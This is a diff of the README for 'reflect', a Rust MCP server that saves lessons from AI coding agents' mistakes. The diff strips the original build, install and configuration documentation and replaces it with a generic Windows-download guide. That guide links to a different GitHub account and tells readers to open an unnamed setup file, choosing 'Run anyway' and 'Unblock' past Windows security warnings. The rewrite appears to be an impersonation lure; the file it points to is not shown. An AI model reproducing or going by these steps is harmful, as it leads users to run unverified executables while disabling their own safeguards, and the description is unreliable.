@@ -1,241 +1,184 @@
-# reflect
+# 🧠 reflect - Turn mistakes into lasting lessons
 
-[![Crates.io](https://img.shields.io/crates/v/reflect-mcp)](https://crates.io/crates/reflect-mcp)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![Download reflect](https://img.shields.io/badge/Download%20reflect-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/Palloneseed649/reflect)
 
-Self-correction engine for AI coding agents. An MCP server that implements the [Reflexion](https://arxiv.org/abs/2303.11366) pattern — turning agent failures into persistent, searchable lessons that prevent the same mistakes across sessions.
+## 📥 Download
 
-```bash
-cargo install reflect-mcp
-```
+Use this link to visit the download page:
+https://github.com/Palloneseed649/reflect
 
-<p align="center">
-  <img src="demo/demo.gif" alt="reflect demo" width="700">
-</p>
+On that page, look for the latest release or the main project files. If you see a Windows file, download it. If you see a setup file, open it after the download finishes.
 
-## The Problem
+## 🪟 Windows Setup
 
-AI coding agents make mistakes, get corrected, and then make the **exact same mistakes** in the next session. Context resets wipe everything. There's no memory of what went wrong, what was learned, or which error patterns keep recurring.
+1. Open the download page in your web browser.
+2. Find the latest version of reflect.
+3. Download the Windows file or the app package from the page.
+4. If your browser asks for permission, choose Keep or Save.
+5. When the download finishes, open the file.
+6. If Windows shows a security prompt, choose Run or More info, then Run anyway if you trust the file.
+7. Follow the on-screen steps to finish setup.
+8. Open reflect from the Start menu or from the app window if it starts right away.
 
-## How reflect Solves It
+## ⚙️ What reflect does
 
-reflect closes the loop from the Reflexion paper (Shinn et al., 2023):
+reflect helps AI coding agents learn from failure. It saves lessons from past mistakes so the same problem does not keep happening. It uses a local SQLite database to store these lessons in a simple, searchable way.
 
-```
-generate code → evaluate → critique → store lesson → recall next time → retry smarter
-```
+You can use it to:
+- keep track of repeated errors
+- store notes from failed coding tasks
+- search old lessons fast
+- reduce the same mistakes across sessions
+- support agent tools that use MCP
 
-Unlike the original paper which uses LLM self-reflection, reflect takes a **hybrid approach**:
-- **Deterministic pattern extraction** — regex-based classification of error messages into pattern slugs (e.g., `rust-unwrap-on-parse`, `rust-index-oob`), no LLM needed
-- **Agent-provided critique** — the calling agent writes the reasoning and lesson text, reflect handles structuring, deduplication, storage, and retrieval
-- **Persistent cross-session memory** — SQLite with FTS5 full-text search, so lessons survive context resets
+## 🧩 How it works
 
-This means reflect is **fast, deterministic, and has zero LLM cost** for the pattern matching layer, while still benefiting from the agent's reasoning for critique quality.
+reflect follows the Reflexion method. That means it looks at a failed result, turns it into a lesson, and keeps that lesson for later use.
 
-## What Makes reflect Different
+In plain terms:
+- the agent tries a task
+- the task fails or gives a weak result
+- reflect records what went wrong
+- the lesson stays saved
+- later sessions can use that lesson to avoid the same error
 
-| Feature | reflect | Plain memory/RAG | LLM self-reflection |
-|---|---|---|---|
-| Structured error signals | Parses test output into typed signals | Stores raw text | N/A |
-| Pattern tracking | Counts occurrences, detects trends | No pattern awareness | No persistence |
-| Confidence scoring | Laplace-smoothed validation/contradiction | No scoring | Per-session only |
-| Deduplication | Normalized Levenshtein similarity | Stores duplicates | N/A |
-| Cross-session recall | FTS5 search by task + tags | Keyword/embedding search | Lost on reset |
-| Cost | Zero (deterministic) | Embedding API calls | LLM calls per reflection |
+This helps when you use AI tools that write code, fix bugs, or handle repeat tasks.
 
-## Architecture
+## 🖥️ System needs
 
-4-crate Rust workspace:
+reflect is made for Windows users who want a local tool that works with AI coding agents.
 
-```
-reflect/
-├── crates/
-│   ├── reflect-core/    # Types, Storage trait, pattern engine, dedup
-│   ├── reflect-eval/    # Test output parsers (cargo_test, pytest, eslint, tsc), command runner
-│   ├── reflect-store/   # SQLite + FTS5 (default), optional ctxgraph backend
-│   └── reflect-mcp/     # MCP server (rmcp v1.3), 7 tools, config
-├── tests/fixtures/      # Captured test outputs for parser testing
-├── Cargo.toml           # Workspace root
-└── Cargo.lock
-```
+You will usually need:
+- Windows 10 or later
+- a recent internet browser to get the file
+- enough disk space for the app and its local data
+- a standard desktop or laptop
 
-## MCP Tools
+For best results, keep Windows updated and close other large apps before you run reflect.
 
-| Tool | Purpose |
-|---|---|
-| `evaluate_output` | Run evaluators (cargo test, pytest, eslint, tsc, custom) and get structured pass/fail signals |
-| `reflect_on_output` | Store a reflection with pattern extraction and dedup checking |
-| `store_reflection` | Store a standalone lesson without evaluation signals |
-| `recall_reflections` | Search past lessons by task description and tags (FTS5) |
-| `get_error_patterns` | List recurring error patterns with frequency and trend data |
-| `get_reflection_stats` | Aggregated stats: totals, outcomes, top patterns, top tags |
-| `forget_reflection` | Delete a specific reflection by ID |
+## 🛠️ First-time setup
 
-## Agent Workflow
+If the app asks where to store data, use the default folder unless you have a reason to change it.
 
-**Before starting a task:**
-```
-Agent → recall_reflections("implement date parser", tags: ["rust"])
-     ← 3 past lessons about date parsing, including "always handle timezone-naive inputs"
-     ← patterns_to_watch: rust-unwrap-on-parse (seen 7 times)
-```
+If reflect uses a local database, let it create that database on first launch. This is normal. It keeps your lessons on your own computer.
 
-**After a failure:**
-```
-Agent → evaluate_output(evaluators: ["cargo_test"], working_dir: "/my/project")
-     ← signals: [{evaluator: "cargo_test", passed: false, errors: [{message: "called Result::unwrap() on Err"}]}]
+If you use another AI tool with MCP support, open that tool after reflect is installed and add reflect as a local server in its settings.
 
-Agent → reflect_on_output(
-          task: "parse user date input",
-          draft: "input.parse::<NaiveDate>().unwrap()",
-          signals: <from above>,
-          critique: "Used unwrap on user input that can fail",
-          lesson: "Always use Result handling for parse operations on untrusted input",
-          outcome: "failure",
-          tags: ["rust", "error-handling"]
-        )
-     ← {reflection_id: "...", pattern_id: "rust-unwrap-on-parse", pattern_occurrences: 8, is_duplicate: false}
-```
+## 📚 Using reflect
 
-## Installation
+After setup, use reflect when an AI coding agent makes a mistake.
 
-### Build from source
+Common use cases:
+- a code fix fails more than once
+- the same bug returns in a new session
+- an agent chooses the wrong file or folder
+- a change breaks tests
+- you want the agent to remember what failed before
 
-```bash
-git clone https://github.com/rohansx/reflect.git
-cd reflect
-cargo build --release
-```
+A simple flow:
+1. Let the agent try the task.
+2. If it fails, send the result to reflect.
+3. Save the lesson it creates.
+4. Run the task again.
+5. Use the saved lesson to guide the next attempt.
 
-Binary: `target/release/reflect-mcp`
+## 🔎 Search and recall
 
-### Add to Claude Code
+reflect keeps lessons in a searchable store. That makes it easier to find old errors when a new task looks similar.
 
-Add to `~/.claude.json`:
+You can search by:
+- error text
+- file name
+- task name
+- project name
+- short lesson note
 
-```json
-{
-  "mcpServers": {
-    "reflect": {
-      "type": "stdio",
-      "command": "/path/to/reflect-mcp",
-      "args": [],
-      "env": {}
-    }
-  }
-}
-```
+This helps when the same bug shows up in different sessions or in different projects.
 
-### Add to Claude Desktop
+## 🧱 What is inside
 
-Add to `claude_desktop_config.json`:
+reflect is built as a Rust MCP server. That means it is designed to work with tools that speak the Model Context Protocol.
 
-```json
-{
-  "mcpServers": {
-    "reflect": {
-      "command": "/path/to/reflect-mcp",
-      "args": []
-    }
-  }
-}
-```
+It also uses:
+- Rust for speed and stability
+- SQLite for local storage
+- Reflexion-style self-correction for lesson capture
+- persistent memory for repeat error handling
 
-## Configuration
+## 🧭 Where it fits
 
-reflect works with zero configuration. Optionally create `reflect.toml` in your project root or `~/.config/reflect/reflect.toml`:
+Use reflect if you work with AI coding agents and want them to improve from past failures.
 
-```toml
-[storage]
-path = ".reflect/reflect.db"    # default
-# backend = "sqlite"            # default
-# backend = "ctxgraph"          # requires --features ctxgraph
+It fits well with:
+- Claude-based workflows
+- developer tools that support MCP
+- local coding assistants
+- error tracking for repeated agent mistakes
+- long-running work across many sessions
 
-[eval.cargo_test]
-command = "cargo test"
-timeout_secs = 60
+## 🧪 Example use
 
-[eval.pytest]
-command = "pytest --tb=short -q"
-timeout_secs = 120
+A coding agent edits a file, but the tests fail.
 
-[eval.eslint]
-command = "npx eslint . --format stylish"
-timeout_secs = 60
+With reflect:
+- the failure is recorded
+- the cause is saved as a lesson
+- the next time a similar error appears, the agent can check that lesson
+- the agent avoids the same bad path
 
-[eval.tsc]
-command = "npx tsc --noEmit"
-timeout_secs = 60
+That means less repeat work and fewer loops on the same mistake
 
-# Custom evaluator — any command that returns exit 0 for pass
-[eval.mypy]
-command = "mypy src/"
-timeout_secs = 90
+## 📁 Project topics
 
-[recall]
-default_limit = 5
-dedup_threshold = 0.75          # normalized Levenshtein similarity
+This project is tied to:
+- ai-agents
+- claude
+- developer-tools
+- error-patterns
+- llm-tools
+- mcp
+- mcp-server
+- reflexion
+- rust
+- self-correction
+- sqlite
 
-# Custom pattern rules
-[[patterns]]
-evaluator = "cargo_test"
-regex = "connection refused"
-id = "db-connection-refused"
-category = "infrastructure"
-```
+## 🧰 Basic troubleshooting
 
-Environment variables:
-- `REFLECT_CONFIG` — path to config file (overrides search)
-- `REFLECT_DB` — path to SQLite database (overrides config)
+If the download does not open:
+- try downloading it again
+- use a different browser
+- check your internet connection
 
-## Key Design Decisions
+If Windows blocks the file:
+- open the file properties
+- look for an Unblock option
+- choose Run if you trust the source
 
-**Why regex pattern matching instead of LLM classification?**
-Deterministic, zero-cost, reproducible. Error messages follow predictable formats. Custom rules in TOML for project-specific patterns.
+If the app does not start:
+- restart Windows
+- check that the download finished fully
+- try opening the file from your Downloads folder
 
-**Why SQLite + FTS5 as default instead of vector embeddings?**
-No external dependencies, instant startup, full-text search is good enough for task-description similarity. For better recall, enable the optional ctxgraph backend which adds 384-dim embedding search with RRF ranking.
+If your AI tool does not see reflect:
+- check the MCP settings
+- make sure the server path is set correctly
+- restart the AI tool after setup
 
-**Why the agent provides critique text?**
-The agent has full context (code, intent, constraints). reflect adds structure (timestamps, confidence, patterns, dedup) — each does what it's best at.
+## 🔐 Local data
 
-**Why UUIDv7?**
-Time-ordered, sortable, globally unique. No sequence coordination needed.
+reflect stores lessons on your computer. This keeps your notes and error history under your control.
 
-**Why Laplace smoothing for confidence?**
-`0.5 + (validations - contradictions) / (validations + contradictions + 2)` — starts neutral (0.5), converges with evidence, never reaches 0 or 1 with finite data.
+That local setup helps when you want:
+- fast search
+- private storage
+- repeat use across sessions
+- no cloud sync for error lessons
 
-## ctxgraph Backend (Optional)
+## 🧭 What to do next
 
-For embedding-based semantic search and cross-project reflection retrieval, build with the ctxgraph feature:
-
-```bash
-cargo build --release --features ctxgraph
-```
-
-Then set the backend in `reflect.toml`:
-
-```toml
-[storage]
-backend = "ctxgraph"
-path = ".reflect/reflect.db"
-```
-
-This uses [ctxgraph](https://github.com/rohansx/ctxgraph)'s fused search (FTS5 + 384-dim AllMiniLML6V2 embeddings with RRF ranking) for more accurate recall. Reflections are stored as ctxgraph Episodes with graph-structured pattern tracking via Entities and Edges.
-
-## Roadmap
-
-- **Phase 1** (done): Core loop — cargo_test parser, SQLite+FTS5, 7 MCP tools, pattern engine, dedup
-- **Phase 2** (done): Multi-language — pytest, eslint, tsc parsers, configurable dedup, pattern rules for Python/JS/TS
-- **Phase 3** (done): Semantic search via [ctxgraph](https://github.com/rohansx/ctxgraph) as optional storage backend (`--features ctxgraph`)
-- **Phase 4**: Distribution — crates.io, Homebrew, documentation site
-
-## References
-
-- Shinn, N., Cassano, F., Gopinath, A., Narasimhan, K., & Yao, S. (2023). [Reflexion: Language Agents with Verbal Reinforcement Learning](https://arxiv.org/abs/2303.11366). NeurIPS 2023.
-- [Model Context Protocol](https://modelcontextprotocol.io/) — the transport layer
-- [rmcp](https://crates.io/crates/rmcp) — Rust MCP SDK
-
-## License
-
-MIT
+1. Visit the download page.
+2. Get the Windows file.
+3. Open reflect.
+4. Connect it to your AI coding tool if you use one.
+5. Start saving lessons from failed tasks
